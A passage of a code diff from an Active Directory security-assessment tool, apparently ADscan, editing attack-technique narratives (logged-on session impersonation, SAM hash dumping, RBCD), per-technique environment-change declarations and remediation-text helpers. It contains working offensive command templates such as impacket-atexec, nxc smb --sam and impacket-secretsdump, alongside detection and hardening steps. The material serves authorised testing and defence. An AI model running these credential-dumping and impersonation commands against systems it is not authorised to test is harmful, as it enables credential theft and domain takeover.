             "Restrict RPC exposure: limit which source hosts may reach TCP 135 and the dynamic RPC range through host firewall rules and network segmentation.",
             "Monitor Event ID 4688 (process creation) for anomalous children of dllhost.exe / mmc.exe / explorer.exe on servers, which is the signature of DCOM-driven execution, and correlate with Event 4624 network logons.",
@@ -6245,24 +6703,25 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
     },
     "hassession": {
         "short": (
-            "A high-value user has an active logon session on {target}, so an "
-            "attacker with admin on that host can impersonate them by scheduling a "
-            "task under their session and inherit their privileges."
+            "A higher-tier account has an active logon session on {target}, a "
+            "lower-tier host, so an attacker with admin on that host can impersonate "
+            "the account by scheduling a task under its session and inherit its "
+            "higher-tier privileges."
         ),
         "long": (
-            "When a privileged user logs on to a member server or workstation, their "
-            "logon session and cached credentials live on that host for the life of "
-            "the session. If an attacker already holds administrator rights on "
-            "{target} (the host where {target} maintains a session), it can "
-            "impersonate that user without ever knowing their password: it registers "
-            "a scheduled task whose principal is the target user's interactive logon "
-            "session, and when the task runs it executes as that user. This turns a "
-            "member-server compromise into control of whichever high-value account "
-            "happened to be logged on there, which is exactly why exposed Tier-0 "
-            "sessions on Tier-1/Tier-2 hosts are so dangerous. The session is "
-            "discovered by enumerating logged-on users on the host; the abuse needs "
-            "local admin plus the Task Scheduler RPC interface reachable on the "
-            "target."
+            "When a privileged account logs on to a host of lower trust than itself (a "
+            "Tier 0 account on a Tier 1 server or Tier 2 workstation, or a Tier 1 "
+            "server admin on a Tier 2 workstation), its logon session and cached "
+            "credentials live on that host for the life of the session. If an attacker "
+            "already holds administrator rights on {target}, it can impersonate that "
+            "account without ever knowing its password: it registers a scheduled task "
+            "whose principal is the account's interactive logon session, and when the "
+            "task runs it executes as that account. This turns a lower-tier host "
+            "compromise into control of whichever higher-tier account happened to be "
+            "logged on there, which is exactly why a session that crosses a tier "
+            "boundary downward is a tiered-admin violation. The session is discovered "
+            "by enumerating logged-on users on the host; the abuse needs local admin "
+            "plus the Task Scheduler RPC interface reachable on the target."
         ),
         "manual": (
             "# Enumerate active sessions to find which privileged user is logged on:\n"
@@ -6272,8 +6731,8 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "impacket-atexec -k -no-pass {domain}/<user>@{target_hostname} 'whoami'"
         ),
         "verify_windows": (
-            "List the interactive sessions on the host to confirm a high-value user "
-            "is logged on:\n"
+            "List the interactive sessions on the host to confirm a higher-tier "
+            "account is logged on:\n"
             "Invoke-Command -ComputerName {target_hostname} -ScriptBlock "
             "{ query user }\n"
             "# Or enumerate logon sessions and their principals:\n"
@@ -6286,10 +6745,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
         ),
         "remediation": (
-            "Enforce tier separation (ESAE): Tier-0 accounts (Domain Admins, Enterprise Admins) must never log on interactively to Tier-1/Tier-2 hosts, so their sessions and cached credentials are never exposed where a member-server compromise can reach them.",
-            "Add high-value accounts to the Protected Users group, which prevents credential caching and delegation of those accounts on the hosts they touch.",
-            "Configure 'Deny log on locally' and 'Deny log on through Remote Desktop Services' user-rights GPOs for Tier-0 groups on all non-Tier-0 systems.",
-            "Monitor Event ID 4698 (scheduled task created) and 4624/4672 (privileged logon) on member servers; a task registered under another user's session, or a Tier-0 logon to a workstation, should be investigated immediately.",
+            "Enforce tier separation (ESAE): a higher-tier account must never log on interactively to a lower-tier host (a Tier 0 account to a Tier 1/Tier 2 host, or a Tier 1 admin to a Tier 2 workstation), so its session and cached credentials are never exposed where a lower-tier compromise can reach them.",
+            "Add the exposed higher-tier accounts to the Protected Users group, which prevents credential caching and delegation of those accounts on the hosts they touch.",
+            "Configure 'Deny log on locally' and 'Deny log on through Remote Desktop Services' user-rights GPOs for the higher-tier groups on the lower-tier hosts, and bind privileged logon to Authentication Policy Silos so a higher-tier account can only obtain a Kerberos TGT from same-tier hosts.",
+            "Monitor Event ID 4698 (scheduled task created) and 4624/4672 (privileged logon) on the lower-tier hosts; a task registered under another account's session, or a higher-tier logon to a lower-tier host, should be investigated immediately.",
         ),
     },
     "scheduledtask": {
@@ -6334,7 +6793,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
         ),
         "remediation": (
-            "Restrict local administrator rights on the host (the prerequisite): Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }, removing every principal that does not require them.",
+            "Restrict local administrator rights on the host (the prerequisite): Invoke-Command -ComputerName {target_hostname} -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }, removing every principal that does not require them.",
             "Enforce tier separation so privileged accounts do not maintain interactive sessions on member servers where a local-admin compromise could impersonate them via a scheduled task.",
             "Enable Task Scheduler operational logging and audit task creation (Event ID 4698); alert on tasks whose principal is a logged-on user session and that were not created by a change-managed process.",
             "Add high-value accounts to Protected Users and apply 'Deny log on locally' GPOs for Tier-0 groups on non-Tier-0 hosts to shrink the set of sessions worth impersonating.",
@@ -6535,6 +6994,51 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "Rotate every service-account password that was ever configured on a host an attacker could reach, treating the exposed values as compromised.",
             "Restrict local administrator rights on member servers and enforce tier separation so an attacker cannot reach SYSTEM to read the SECURITY hive in the first place.",
             "Monitor Event IDs 4656/4663 for handle/access requests to the SECURITY and SYSTEM registry hives and Event 4688 for the tooling that reads them, and alert on remote registry access outside change windows.",
+        ),
+    },
+    "dumpsam": {
+        "short": (
+            "With SYSTEM on {target}, an attacker reads the SAM database and recovers "
+            "the password hashes of every LOCAL account on that host, including the "
+            "built-in Administrator."
+        ),
+        "long": (
+            "The Security Account Manager database holds the password hashes of the "
+            "host's LOCAL accounts, and it lives in the SAM registry hive, encrypted "
+            "with a key assembled from the SYSTEM hive. An attacker who reaches SYSTEM "
+            "on {target} can read both hives and recover those hashes offline. The "
+            "hashes are not domain credentials, so this is not a direct route to the "
+            "directory. What makes it valuable is reuse: where a local administrator "
+            "password was set from a single image or script, the same hash authenticates "
+            "to every host built the same way, and because NTLM accepts the hash "
+            "directly there is nothing to crack first. That turns one compromised "
+            "workstation into administrative access across a fleet, which is the usual "
+            "path from a single foothold to broad reach. Windows LAPS removes the reuse "
+            "by giving every machine a different, rotated password. The prerequisite is "
+            "administrative (SYSTEM) access on the target."
+        ),
+        "manual": (
+            "# Read the SAM + SYSTEM hives remotely and parse local hashes:\n"
+            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain} --sam\n"
+            "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass {domain}/<user>@<target-fqdn>"
+        ),
+        "verify_windows": (
+            "Confirm the account is a local admin (the prerequisite) and check whether "
+            "the host's local administrator password is managed and unique:\n"
+            "Get-LapsADPassword -Identity {target_identity} -AsPlainText\n"
+            "Invoke-Command -ComputerName {target_hostname} -ScriptBlock { Get-LocalUser |\n"
+            "  Select-Object Name, Enabled, PasswordLastSet }"
+        ),
+        "verify_linux": (
+            "Confirm admin reach over the host (read-only marker, no dump):\n"
+            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == SAM-dump-capable\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets"
+        ),
+        "remediation": (
+            "Deploy Windows LAPS so every machine holds a different, automatically rotated local administrator password, and confirm coverage per host with Get-LapsADPassword -Identity <computer>; a recovered hash then opens one machine instead of the fleet.",
+            "Audit the local accounts that exist on the host (Get-LocalUser | Select-Object Name, Enabled, PasswordLastSet), disable the ones nobody uses, and keep the built-in Administrator disabled where it is not required.",
+            "Leave LocalAccountTokenFilterPolicy at its default so local accounts cannot authenticate remotely, which removes the reuse value of a recovered local hash even where one is shared.",
+            "Restrict local administrator rights on member servers and workstations, disable Remote Registry where it is not needed, and audit Event IDs 4656/4663 for handle and access requests against the SAM and SYSTEM registry hives.",
         ),
     },
     "dumplsass": {
@@ -6942,7 +7446,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "remediation": (
             "Enumerate who can write the account-restrictions property set on the computer and remove non-administrative principals: (Get-Acl \"AD:{target_dn}\").Access | Where-Object { $_.ObjectType -eq '4c164200-20c0-11d0-a768-00aa006e0529' }.",
-            "Read and, where unexpected, clear the RBCD attribute: Get-ADComputer <host> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity then Set-ADComputer <host> -Clear msDS-AllowedToActOnBehalfOfOtherIdentity.",
+            "Read and, where unexpected, clear the RBCD attribute: Get-ADComputer {target_hostname} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity then Set-ADComputer {target_hostname} -Clear msDS-AllowedToActOnBehalfOfOtherIdentity.",
             "Set ms-DS-MachineAccountQuota to 0 (Set-ADDomain -Identity <domain> -Replace @{'ms-DS-MachineAccountQuota'=0}) so an attacker cannot create a new computer account to use as the delegate. Note this does not stop RBCD via an already-owned computer, so the ACE fix above is the primary control.",
             "Audit Event ID 5136 for changes to msDS-AllowedToActOnBehalfOfOtherIdentity and Event ID 4769 for S4U2Proxy ticket requests, and alert on delegation configured to a non-service computer account.",
         ),
@@ -7476,6 +7980,234 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
 }
 
 
+# ── Environment-change declarations (the safeguard-matrix impact data) ───────
+# For each technique, the ledger change ``kind`` tokens its execution path
+# registers. See the ``environment_change_kinds`` field docstring for the
+# contract; an empty tuple DECLARES "modifies nothing", and a relation absent
+# from this map stays UNDECLARED (``None``) and fails loudly downstream.
+#
+# AUTHORING RULE: add an entry ONLY after reading the technique's execution path
+# and the ``register_change`` call it makes. This map describes what ADSCAN
+# writes, never what the technique does in the wild.
+#
+# Deliberately NO file:line provenance here. A hand-copied line number is stale
+# after the first refactor and nobody notices, which is the silent failure this
+# whole axis exists to prevent. What IS checked, structurally and without
+# rotting, is that every kind declared here is a real ledger change kind
+# (``cleanup_taxonomy.KIND_DISPLAY``) — so renaming a kind in the ledger fails
+# CI here instead of printing a stale claim in a client document. The code
+# reference belongs in the commit that adds the declaration, not in the data.
+_ENVIRONMENT_CHANGE_DECLARATIONS: dict[str, tuple[str, ...]] = {
+    # ── ACL / ACE family. Every branch of ``execute_ace_step`` is explicit, so
+    # this family is declared completely, writes and read-only branches alike.
+    "genericall": ("shadow_credentials_added",),
+    "genericwrite": ("shadow_credentials_added",),
+    "writeaccountrestrictions": ("shadow_credentials_added",),
+    "addkeycredentiallink": ("shadow_credentials_added",),
+    "forcechangepassword": ("password_changed",),
+    # AllExtendedRights is pure DISPATCH: execute_ace_step remaps it to the one
+    # concrete extended-right abuse the target's object class confers, then
+    # falls through to that branch. So its writes are exactly the union of the
+    # branches it can reach: a user target reaches the ForceChangePassword
+    # branch, which registers ``password_changed`` after the reset confirms; a
+    # domain target reaches DCSync and a computer target ReadLAPSPassword, both
+    # of which return without registering anything; any other object class is
+    # refused before acting.
+    "allextendedrights": ("password_changed",),
+    "writedacl": ("dacl_ace_added",),
+    "writeowner": ("owner_changed",),
+    "writespn": ("spn_added",),
+    "addmember": ("group_membership_added",),
+    "addself": ("group_membership_added",),
+    # Ownership grants itself a FullControl ACE first, then chains to the
+    # GenericAll actions.
+    "owns": ("dacl_ace_added", "shadow_credentials_added"),
+    # Read-only branches: they return without reaching ``_acl_cleanup_register``.
+    "dcsync": (),
+    "readgmsapassword": (),
+    "readlapspassword": (),
+    # ── ADCS. Every abuse ADscan executes converges on ONE disclosure point,
+    # ``adcs/esc_cleanup.py::register_issued_certificate`` (native enrollment via
+    # ``adcs/cert_request.py``, the relay ESCs via ``adcs/esc_relay.py``).
+    "adcsesc1": ("issued_certificate",),
+    "adcsesc2": ("issued_certificate",),
+    "adcsesc3": ("issued_certificate",),
+    "adcsesc6": ("issued_certificate",),
+    "adcsesc7": ("issued_certificate",),
+    "adcsesc8": ("issued_certificate",),
+    "adcsesc9": ("issued_certificate",),
+    "adcsesc11": ("issued_certificate",),
+    "adcsesc13": ("issued_certificate",),
+    "adcsesc14": ("issued_certificate",),
+    "adcsesc15": ("issued_certificate",),
+    "coerceandrelayntlmtoadcs": ("issued_certificate",),
+    # ESC4 rewrites the template before requesting the certificate.
+    "adcsesc4": ("template_mutated", "issued_certificate"),
+    # ESC5 steals the CA signing key and forges offline, leaving a transient
+    # service and key file on the CA host while it does.
+    "adcsesc5": (
+        "ca_private_key_exfiltrated",
+        "ca_backup_service",
+        "ca_backup_temp_pfx",
+        "forged_certificate",
+    ),
+    # ── NTLM relay to RBCD / shadow credentials.
+    "ntlmv1relayrbcd": ("machine_account_created", "rbcd_delegation_added"),
+    "ntlmv1relayshadowcreds": ("keycredentiallink_added",),
+    # ── SPN relocation.
+    "spnjack": ("spn_relocated",),
+    # ── Native credential dumps: the artefacts land on the HOST filesystem.
+    "dumplsass": ("file_written", "file_uploaded"),
+    "dumplsa": ("file_written",),
+    # DumpSAM prefers an inline registry read (no disk artefact); the fallback
+    # route exports the SAM + SYSTEM hives to the host and removes them, so the
+    # ledger declares the write it MAY make rather than the quieter route.
+    "dumpsam": ("file_written",),
+    "dumpdpapi": ("file_written",),
+    "backupoperatorescalation": ("file_written",),
+    "poisoncapturentlmv2crack": ("file_written",),
+    # ── Entry vectors. Every branch of ``cli/spraying.py`` authenticates and
+    # writes nothing to the directory (the combo files it builds are local to
+    # the operator). GPP and user-description harvesting are SMB/LDAP READS
+    # whose recovered secrets are verified by authenticating.
+    "blankpassword": (),
+    "computerpre2k": (),
+    "passwordspray": (),
+    "useraspass": (),
+    "gpppassword": (),
+    "userdescription": (),
+    # ── Kerberos. Roasting reads: ``kerberoast`` filters on accounts that
+    # ALREADY hold an SPN and never adds or moves one; AS-REP roasting requests
+    # a ticket; the key-list service parses a KERB-KEY-LIST-REQ reply. The RODC
+    # golden ticket is forged in memory and written to the operator's own
+    # workspace, never to the client.
+    "kerberoasting": (),
+    "asreproasting": (),
+    "kerberoskeylist": (),
+    "forgerodcgoldenticket": (),
+    "timeroasting": (),
+    # ── Read-only credential-access relations.
+    "hasshadowcredentials": (),
+    "readshare": (),
+    # ── Trust. ``raisechild`` replicates and forges locally; the poisoned TGT
+    # never becomes a directory object.
+    "raisechild": (),
+    # Cross-forest TGT delegation adds a relay SPN to the trusted DC's machine
+    # account and an ADIDNS A record, both inside an RAII scope that removes
+    # them on exit.
+    "crossorgtgtdelegation": ("spn_added", "dns_record_added"),
+    # ── Writes confirmed in code that do NOT reach the change ledger. They are
+    # declared so the matrix states the modification truthfully; the rollback
+    # column degrades for them (see safeguard_profile.LEDGER_UNTRACKED_WRITES).
+    # Staging an extractor binary on the RODC host is a file upload.
+    "extractrodckrbtgtsecret": ("file_uploaded",),
+    # Adding the target to the RODC password-replication policy is an LDAP
+    # modify of msDS-RevealOnDemandGroup (and, when present, a temporary
+    # emptying of msDS-NeverRevealGroup) on the RODC computer object.
+    "preparerodccredentialcaching": ("rodc_prp_modified",),
+    # ── Reads confirmed against the executor.
+    # OPENROWSET bulk read is a pure SELECT ... FROM OPENROWSET(BULK ...): no
+    # temp table, no BULK INSERT, no sp_configure.
+    "mssql_openrowset_bulk_read": (),
+    # ── Declared "supported" in the catalog but having NO executor branch in
+    # attack_path_execution. They write nothing because they DO NOT RUN, which
+    # is a different statement from "audited read-only" and the matrix says so
+    # (see safeguard_profile.NO_EXECUTOR_RELATIONS).
+    "scheduledtask": (),
+    "mssql_impersonate_login": (),
+    "mssql_trustworthy_db_escalation": (),
+    # MSSQL NetNTLMv2 theft has no executor branch either: nothing in the
+    # attack-path executor or the MSSQL services dispatches this relation, and
+    # the only xp_dirtree code ADscan runs is the read-only credential-hygiene
+    # review (mssql_xp_dirtree_review_service), which walks directories and
+    # never coerces authentication. So it writes nothing because it does not
+    # run, which the matrix states as such rather than as "audited read-only".
+    "mssql_ntlmv2_theft": (),
+    # ── Writes confirmed in code that do NOT reach the change ledger.
+    # HasSession runs commands as the logged-on user through a Task Scheduler
+    # task: it registers a task and an ADMIN$ log file, and on the
+    # create+addmember plan it creates an account and adds it to Domain Admins
+    # (or the host's local Administrators). Its own rollback removes all of it.
+    "hassession": (
+        "scheduled_task_created",
+        "file_written",
+        "user_created",
+        "group_membership_added",
+    ),
+    # WriteLogonScript stages a .bat on NETLOGON/SYSVOL and overwrites the
+    # target user's scriptPath; the script resets another user's password when
+    # that user next logs on.
+    "writelogonscript": (
+        "file_uploaded",
+        "logon_script_path_modified",
+        "password_changed",
+    ),
+    # ── Lateral movement and delegation.
+    # The ACCESS VERIFICATION of every one of these is read-only (an SMB
+    # tree_connect, a WinRM probe script, an RDP handshake, a SELECT). What can
+    # write is the post-success follow-up the operator chooses on a terminal
+    # step, and that is attributed here because the client sees it as part of
+    # the technique.
+    #
+    # AdminTo: the post-success credential harvest runs a registry/LSASS dump,
+    # whose fallback saves a hive and whose LSASS backends push a helper binary.
+    "adminto": ("file_written", "file_uploaded"),
+    # CanPSRemote: the WinRM follow-up uploads the pivot agent and stages a zip
+    # under the target's temp directory. Neither reaches the ledger.
+    "canpsremote": ("file_uploaded", "file_written"),
+    # CanRDP: the probe is a handshake and the follow-up launches a LOCAL
+    # client. Windows creating a profile on an interactive logon is the OS's
+    # own side effect, not a write ADscan makes.
+    "canrdp": (),
+    # SQLAccess / SQLAdmin: verification is read-only; the post-auth workflow
+    # flips xp_cmdshell and the takeover creates a database/host admin account.
+    "sqlaccess": ("mssql_xp_cmdshell_enabled", "mssql_postex_account"),
+    "sqladmin": ("mssql_xp_cmdshell_enabled", "mssql_postex_account"),
+    # FullControlShare / WriteShare / GuestSession: no executor branch. Share
+    # writability is derived from maximal-access, never from a test write.
+    "fullcontrolshare": (),
+    "writeshare": (),
+    "guestsession": (),
+    # AllowedToDelegate: S4U2Self + S4U2Proxy; the ccache lands in the
+    # operator's workspace. No LDAP modify.
+    "allowedtodelegate": (),
+    # AllowedToAct is the INBOUND RBCD consumer: it exploits an attribute the
+    # client already set and mints a ticket. It does NOT create a machine
+    # account and never writes msDS-AllowedToActOnBehalfOfOtherIdentity. The
+    # membership that enables it comes from a separate AddMember step, which is
+    # where that write belongs.
+    "allowedtoact": (),
+    # ── MSSQL command channel and SYSTEM escalation.
+    "xp_cmdshell": ("mssql_xp_cmdshell_enabled",),
+    "mssql_seimpersonate_escalation": (
+        "mssql_clr_assembly_loaded",
+        "mssql_postex_account",
+    ),
+    "mssql_token_theft_escalation": ("mssql_clr_assembly_loaded",),
+}
+
+# A technique ADscan does NOT execute writes nothing by construction: the
+# coverage matrix reports it as detected and mapped. Declaring this from
+# ``support_kind`` keeps the ~30 non-executable entries out of the hand-
+# maintained map while still leaving a NEW *supported* technique undeclared.
+for _rel, _entry_obj in ATTACK_STEP_CATALOG.items():
+    if _rel in _ENVIRONMENT_CHANGE_DECLARATIONS:
+        continue
+    if _entry_obj.support_kind in {"unsupported", "policy_blocked", "context"}:
+        _ENVIRONMENT_CHANGE_DECLARATIONS[_rel] = ()
+
+ATTACK_STEP_CATALOG = {  # type: ignore[assignment]
+    _rel: (
+        replace(
+            _entry_obj, environment_change_kinds=_ENVIRONMENT_CHANGE_DECLARATIONS[_rel]
+        )
+        if _rel in _ENVIRONMENT_CHANGE_DECLARATIONS
+        else _entry_obj
+    )
+    for _rel, _entry_obj in ATTACK_STEP_CATALOG.items()
+}
+
+
 # Apply narrative overlays to the base catalog. We do this here (rather than
 # retyping 99 _entry() calls) so the overlay dict stays focused on narratives.
 _CATALOG_WITH_NARRATIVES: dict[str, AttackStepCatalogEntry] = {}
@@ -7794,12 +8526,12 @@ def _acl_remediation_fragments(
                 "covers each hand over the host on their own: msDS-KeyCredentialLink (Shadow "
                 "Credentials: a certificate the machine account can authenticate with) and "
                 "msDS-AllowedToActOnBehalfOfOtherIdentity (which lets another host impersonate "
-                f'any user to this one). A scoped grant such as {scoped}<group>:WP;'
+                f"any user to this one). A scoped grant such as {scoped}<group>:WP;"
                 'servicePrincipalName"` gives the delegation its attribute and none of those.'
             ),
             "genericwrite_written_check": (
                 "Clear anything already written through the ACE before removing it, or the "
-                f'takeover survives the fix. Check the two attributes on {target}: `Get-ADComputer '
+                f"takeover survives the fix. Check the two attributes on {target}: `Get-ADComputer "
                 f'"{dn}" -Properties msDS-KeyCredentialLink, msDS-AllowedToActOnBehalfOfOtherIdentity`. '
                 "A key credential nobody deliberately enrolled or a populated delegation attribute "
                 f'should be cleared with `Set-ADObject "{dn}" -Clear <attribute>`.'
@@ -7895,7 +8627,7 @@ def _acl_remediation_fragments(
             ),
             "genericwrite_written_check": (
                 "Clear anything already written through the ACE before removing it, or the "
-                f'takeover survives the fix. Check the three attributes on {target}: `Get-ADObject '
+                f"takeover survives the fix. Check the three attributes on {target}: `Get-ADObject "
                 f'"{dn}" -Properties msDS-KeyCredentialLink, servicePrincipalName, '
                 "msDS-AllowedToActOnBehalfOfOtherIdentity`. A key credential nobody deliberately "
                 "enrolled, an unexpected service principal name, or a populated delegation "
@@ -7943,7 +8675,7 @@ def _acl_remediation_fragments(
         ),
         "genericwrite_written_check": (
             "Clear anything already written through the ACE before removing it, or the takeover "
-            f'survives the fix. Read the writable attributes on {target} appropriate to its object '
+            f"survives the fix. Read the writable attributes on {target} appropriate to its object "
             "class (group membership, or the key-credential / servicePrincipalName / delegation "
             "attributes for an account) and clear any value that was not deliberately set with "
             f'`Set-ADObject "{dn}" -Clear <attribute>`.'
@@ -7983,9 +8715,7 @@ _COMMAND_TOKEN_QUOTE_KEYS: frozenset[str] = frozenset(
 )
 
 
-def _quote_command_token_placeholders(
-    tmpl: str, placeholders: dict[str, str]
-) -> str:
+def _quote_command_token_placeholders(tmpl: str, placeholders: dict[str, str]) -> str:
     """Wrap STANDALONE whitespace-bearing identifier tokens in the template in quotes.
 
     Applied to a COMMAND template BEFORE substitution: a placeholder that is a
@@ -8162,8 +8892,23 @@ def _share_secret_rotation_bullet(target: str) -> str:
     )
 
 
+def _authorized_group_placeholder(netbios_domain: str) -> str:
+    """Return the fill-in for the group a tightened share ACL should grant.
+
+    Which group needs read on a share is the client's call, not ours, so the
+    group half stays an obvious fill-in. The domain half is the assessed
+    directory's own flat name when it is known, because
+    ``Grant-SmbShareAccess -AccountName`` takes an NT-account value and a
+    fabricated prefix is a command that acts on nothing: a graded kit shipped
+    an invented domain and an invented file-share admins group in this very
+    argument, against a directory that had neither.
+    """
+    flat = str(netbios_domain or "").strip()
+    return f"'{flat}\\<authorized_group>'" if flat else "'<authorized_group>'"
+
+
 def _share_secret_remediation_clauses(
-    details: dict[str, Any], *, target: str
+    details: dict[str, Any], *, target: str, netbios_domain: str = ""
 ) -> tuple[str, str, str, str]:
     """Return the four reached-via-aware remediation bullets for a share-secret read.
 
@@ -8190,8 +8935,12 @@ def _share_secret_remediation_clauses(
     gets a command they can paste as written, rather than a template with a
     blank to fill in; when no share name was captured, the sentence degrades
     to a plain description of the affected share instead of a broken command.
+    The group the tightened ACL grants is the one object here the assessment
+    cannot know, so it stays a fill-in on the assessed directory's own flat
+    name (see :func:`_authorized_group_placeholder`).
     """
     share = _first_share_name(details)
+    authorized_group = _authorized_group_placeholder(netbios_domain)
     share_ref = f"the {share} share" if share else "the affected share"
     remove_bullet = (
         f"Remove the credential-bearing file from {share_ref}, or replace it "
@@ -8255,9 +9004,9 @@ def _share_secret_remediation_clauses(
                 f"access, remove it entirely with Remove-SmbShare -Name "
                 f"'{share}' -Force; where it must remain reachable, "
                 f"restrict it to named accounts with Grant-SmbShareAccess "
-                f"-Name '{share}' -AccountName 'CORP\\FileShareAdmins' "
-                "-AccessRight Read -Force (substituting the group that "
-                "actually needs it) after revoking the broad grant."
+                f"-Name '{share}' -AccountName {authorized_group} "
+                "-AccessRight Read -Force after revoking the broad grant, "
+                "substituting the group that needs it for the fill-in."
             )
         else:
             account_bullet = (
@@ -8275,8 +9024,8 @@ def _share_secret_remediation_clauses(
             f"-Name '{share}' -AccountName 'Everyone' -Force (and "
             "'Authenticated Users' if present), then grant only the "
             f"specific group that needs it with Grant-SmbShareAccess -Name "
-            f"'{share}' -AccountName 'CORP\\FileShareAdmins' -AccessRight "
-            "Read -Force (substituting the group that actually needs it)."
+            f"'{share}' -AccountName {authorized_group} -AccessRight "
+            "Read -Force, substituting that group for the fill-in."
         )
         account_bullet = (
             "Apply the matching restriction on the underlying NTFS "
@@ -8340,7 +9089,9 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
         )
 
         _report_domain = (
-            str(details.get("domain") or "").strip() if isinstance(details, dict) else ""
+            str(details.get("domain") or "").strip()
+            if isinstance(details, dict)
+            else ""
         )
         source = humanize_principal_for_prose(
             label=source,
@@ -8376,6 +9127,53 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
         source = "the source principal"
     if not target:
         target = "the target object"
+
+    # {actor} — WHO ACTS in this step, which is NOT always the step's source
+    # object. An edge records the object the privilege hangs off (an ACE holder,
+    # the group whose membership grants the right, a well-known identity), and
+    # that object is the right subject of a REMEDIATION sentence. It is the wrong
+    # subject of an "acts" sentence when it is a collective: a group cannot act,
+    # only a member can, so a narrative built on {source} could state that a
+    # group controls its own member. {source} therefore keeps naming the object
+    # the right sits on, and the ACTING slot in a narrative uses {actor}, which
+    # the SSOT resolves to the concrete principal when one is known (the step's
+    # executed actor, or the member carried forward through the chain) and
+    # degrades to "a member of <collective>" when it genuinely is not. For a
+    # source that already names one individual, {actor} IS {source}, so that
+    # prose is byte-identical.
+    actor = source
+    try:
+        from adscan_internal.services.step_actor_resolution import (
+            resolve_step_actor,
+            source_is_collective_principal,
+        )
+        from adscan_internal.services.well_known_principals import (
+            humanize_principal_for_prose,
+        )
+
+        resolved_actor = resolve_step_actor(details)
+        if resolved_actor is not None:
+            _actor_label, _actor_sam, _actor_kind = resolved_actor
+            actor = (
+                humanize_principal_for_prose(
+                    label=_actor_label,
+                    samaccountname=_actor_sam,
+                    kind=_actor_kind,
+                    report_domain=(
+                        str(details.get("domain") or "").strip()
+                        if isinstance(details, dict)
+                        else ""
+                    ),
+                )
+                or _actor_label
+            )
+        elif source_is_collective_principal(details):
+            # Honest: ADscan did not identify which member acted, and every
+            # member could have. Naming the collective in the acting slot would
+            # claim a group acted on its own member.
+            actor = f"a member of {source}"
+    except Exception:  # pragma: no cover - actor resolution is best-effort
+        actor = source
 
     relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
     # Human-formatted label from the shared vocabulary (lazy import to avoid a
@@ -8503,8 +9301,10 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
     # there were no credentials at all, so the clause must not claim a domain
     # account was required (a client-facing honesty defect against the proven
     # null-session read). Unused by every other relation's template.
+    # ``source=actor``: this clause names WHO could read the file, an acting
+    # slot, so it takes the acting principal and never a collective label.
     gpp_access_clause = _gpp_access_clause(
-        details if isinstance(details, dict) else {}, source=source, target=target
+        details if isinstance(details, dict) else {}, source=actor, target=target
     )
 
     # The PasswordInShare narrative's access clause and remediation both need
@@ -8514,15 +9314,20 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
     # for a null session, a registry edit for a guest-session ACE). Unused by
     # every other relation's template.
     _share_secret_details = details if isinstance(details, dict) else {}
+    # ``source=actor``: an acting slot (who reached the file), same as the GPP
+    # clause above. The remediation fragments below keep the SOURCE object,
+    # which is what an ACL/account fix has to name.
     share_secret_access_clause = _share_secret_access_clause(
-        _share_secret_details, source=source, target=target
+        _share_secret_details, source=actor, target=target
     )
     (
         share_secret_access_removal,
         share_secret_account_hardening,
         share_secret_file_removal,
         share_secret_rotation,
-    ) = _share_secret_remediation_clauses(_share_secret_details, target=target)
+    ) = _share_secret_remediation_clauses(
+        _share_secret_details, target=target, netbios_domain=netbios_domain
+    )
 
     # REAL, machine-resolvable object identifiers for the independent-
     # verification commands (verify_windows / verify_linux). {source}/{target}
@@ -8637,6 +9442,9 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
     return {
         "source": source,
         "target": target,
+        # The ACTING principal (see the {actor} block above). Equals {source}
+        # whenever the source already names one individual.
+        "actor": actor,
         "source_type": _typed_object_noun(source_object_class, source),
         "target_type": _typed_object_noun(target_object_class, target),
         # Object-class-aware ACL-abuse fragments (see _acl_abuse_prose / block).
@@ -8681,7 +9489,11 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
         # the source's real sAMAccountName / DN, then to the source display label
         # as a last resort so a plain sAMAccountName-shaped label still renders.
         "executing_principal": (
-            (str(details.get("user") or "").strip() if isinstance(details, dict) else "")
+            (
+                str(details.get("user") or "").strip()
+                if isinstance(details, dict)
+                else ""
+            )
             or _real_samaccountname("source")
             or _real_dn("source")
             or source
@@ -8888,7 +9700,7 @@ _DYNAMIC_IDENTITY_MEMBERSHIP_REMEDIATION: tuple[str, ...] = (
     "a credential to a named, tier-appropriate group).",
     "Audit every object whose DACL grants rights to {target}, and replace the "
     "broad grant with a specific, tier-appropriate group. Verify with dsacls or "
-    "(Get-Acl \"AD:{target_dn}\").Access.",
+    '(Get-Acl "AD:{target_dn}").Access.',
 )
 
 
@@ -8948,12 +9760,14 @@ def _step_target_is_dynamic_identity(step: dict[str, Any]) -> bool:
     if not isinstance(step, dict):
         return False
     details = step.get("details") if isinstance(step.get("details"), dict) else {}
-    target_sid = str(details.get("target_sid") or "").strip() if isinstance(details, dict) else ""
+    target_sid = (
+        str(details.get("target_sid") or "").strip()
+        if isinstance(details, dict)
+        else ""
+    )
     target_label = ""
     if isinstance(details, dict):
-        target_label = str(
-            details.get("to") or details.get("display_to") or ""
-        ).strip()
+        target_label = str(details.get("to") or details.get("display_to") or "").strip()
     if not target_label:
